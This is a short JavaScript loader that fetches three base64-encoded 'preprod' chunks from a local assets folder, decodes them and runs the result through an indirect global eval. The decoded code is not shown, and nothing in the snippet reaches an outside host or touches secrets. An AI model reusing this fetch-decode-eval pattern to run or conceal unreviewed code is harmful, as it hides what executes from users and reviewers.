(()=>{
  const files=[
    "v040-preprod-001.b64",
    "v040-preprod-002.b64",
    "v040-preprod-003.b64"
  ];

  let encoded="";
  for(const name of files){
    const request=new XMLHttpRequest();
    request.open("GET","assets/source/"+name,false);
    request.send(null);
    if(request.status!==200&&request.status!==0) throw new Error("No se pudo cargar la lógica íntegra "+name);
    encoded+=request.responseText.trim();
  }

  const binary=atob(encoded);
  const bytes=Uint8Array.from(binary,char=>char.charCodeAt(0));
  const source=new TextDecoder("utf-8",{fatal:true}).decode(bytes);
  (0,eval)(source);
})();
